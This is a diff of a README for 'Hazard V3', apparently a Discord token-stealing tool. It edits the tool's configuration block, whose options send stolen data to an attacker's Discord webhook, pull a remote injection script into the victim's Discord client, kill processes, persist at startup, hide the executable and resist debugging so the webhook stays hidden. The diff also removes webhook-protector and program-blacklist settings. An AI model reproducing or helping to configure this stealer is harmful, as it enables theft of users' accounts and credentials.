@@ -73,15 +73,10 @@ If you want to change the config, open up [main.py](https://github.com/Rdmo1/Haz
 
 ```py
 config = {
-    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdmo1/Discord-Webhook-Protector
-    # Recommend using https://github.com/Rdmo1/Discord-Webhook-Protector so your webhook can't be spammed or deleted
+    # replace WEBHOOK_HERE with your webhook ↓↓
     'webhook': "WEBHOOK_HERE",
-    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdmo1/Discord-Webhook-Protector
-    'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdmo1/Discord-Injection/master/injection.js",
-    # if True, it will ping @everyone when someone ran Hazard V3
-    'ping_on_run': False,
     # set to False if you don't want it to kill programs such as discord upon running the exe
     'kill_processes': True,
     # if you want the file to run at startup
@@ -90,13 +85,6 @@ config = {
     'hide_self': True,
     # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
     'anti_debug': True,
-    # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
-    'blackListedPrograms':
-    [
-      ...
-    ]
-
-}
 ```
 
 ---
